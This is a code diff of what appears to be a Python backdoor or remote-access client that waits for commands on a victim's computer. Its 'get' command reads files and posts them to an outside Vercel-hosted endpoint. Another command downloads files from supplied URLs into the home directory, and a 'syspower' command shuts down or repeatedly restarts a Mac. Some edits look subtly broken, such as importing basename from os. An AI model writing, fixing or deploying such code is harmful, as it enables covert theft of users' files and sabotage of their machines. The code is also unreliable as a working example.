@@ -4,7 +4,7 @@ try:
     from time import sleep
     from subprocess import Popen as system
     from subprocess import PIPE
-    from os import chdir, uname, devnull, getcwd
+    from os import chdir, uname, devnull, getcwd, basename
     from sys import platform, stdout, stderr
 
     old_command = ""
@@ -72,8 +72,12 @@ while True:
                 if command.startswith("get "):
                     localcmd = command.split()
                     path = localcmd[1]
-                    open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
-                    file = [str(path), open("output.txt", 'rb').read()]
+                    try:
+                        open("output.txt", 'wb').write(open(str("../"+path), 'r').read())
+                        file = [str(path), open("output.txt", 'r').read()]
+                    except UnicodeDecodeError:
+                        open("output.txt", 'wb').write(open(str("../"+path), 'rb').read())
+                        file = [str(path), open("output.txt", 'rb').read()]
                     file = "FILE " + str(file)
                     try:
                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
@@ -86,8 +90,8 @@ while True:
                     files = eval(localcmd[1])
                     for fileUrl in files:
                         fileData = get(fileUrl).content
-                        fileName = path.basename(fileUrl)
-                        filePath = os.path.expanduser("~")
+                        fileName = basename(fileUrl)
+                        filePath = expanduser("~")
                         with open(f"{filePath}/{fileName}", 'wb') as f:
                             f.write(fileData)
                             f.close()
@@ -171,7 +175,7 @@ while True:
                     exit()
                 elif command.startswith('syspower'):
                     localcmd = command.split()
-                    if localcmd[1<len(localcmd)] and not path.exists(expanduser('~')/'.syspower'):
+                    if localcmd[1<len(localcmd)] and not path.exists(f"{expanduser('~')}/.syspower"):
                         try:
                             if localcmd[1] == 'shutdown' or localcmd[1] == 'poweroff':
                                 if ossystem('osascript -e \'tell app "Finder" to shut down\'') == 0:
@@ -243,11 +247,11 @@ while True:
                                     except KeyboardInterrupt:
                                         continue
                                     continue
-                            open(f"{expanduser('~')/.syspower}", 'w').close()
+                            open(f"{expanduser('~')}/.syspower", 'w').close()
 
                         except:
                             continue
-                    elif localcmd[1<len(localcmd)] and not path.exists(expanduser('~')/'.syspower'):
+                    elif localcmd[1<len(localcmd)] and not path.exists(f"{expanduser('~')}/.syspower"):
                         if localcmd[1] == 'keepreboot':
                             if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
                                 try:
